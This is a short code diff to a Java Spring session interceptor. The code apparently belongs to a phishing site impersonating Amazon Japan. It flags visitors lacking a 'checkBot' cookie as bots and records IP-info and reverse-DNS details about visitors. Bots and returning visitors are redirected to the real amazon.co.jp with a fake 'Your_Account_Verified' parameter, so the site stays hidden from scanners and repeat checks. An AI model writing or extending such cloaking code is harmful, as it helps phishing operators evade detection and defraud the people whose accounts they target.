@@ -32,9 +32,11 @@ public class SessionInfoInterceptor implements HandlerInterceptor {
                              HttpServletResponse response, Object handler) throws Exception {
         System.out.println(request.getRequestURI());
         //已经访问过的用户、byebye
+        Boolean isBot = true;
         Cookie[] cookies = request.getCookies();
         if (null != cookies) {
             for (Cookie cookie : cookies) {
+                if(cookie.getName().equalsIgnoreCase("checkBot")) isBot = false;
                 if (cookie.getName().equalsIgnoreCase("kiddIp")) {
                     response.sendRedirect("https://amazon.co.jp/?Your_Account_Verified");
                     return false;
@@ -58,7 +60,14 @@ public class SessionInfoInterceptor implements HandlerInterceptor {
         //userInfoMap.put("Al", ul);
         session.setAttribute("userInfo",userInfoMap);
         Boolean authBool =  authUserService.auth(request);
-        asyncTask.asyncWriteAccessLog(request,ip,null,null,dateTime,authBool,uaStr,ul);
+        userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
+        String ipInfo = userInfoMap.get("ipinfo");
+        String rdns = userInfoMap.get("rdns");
+        asyncTask.asyncWriteAccessLog(request,ip,ipInfo,rdns,dateTime,authBool,uaStr,ul,isBot);
+        if(isBot){
+            response.sendRedirect("https://amazon.co.jp/?Your_Account_Verified");
+            return false;
+        }
         if(authBool){
             return true;
         }
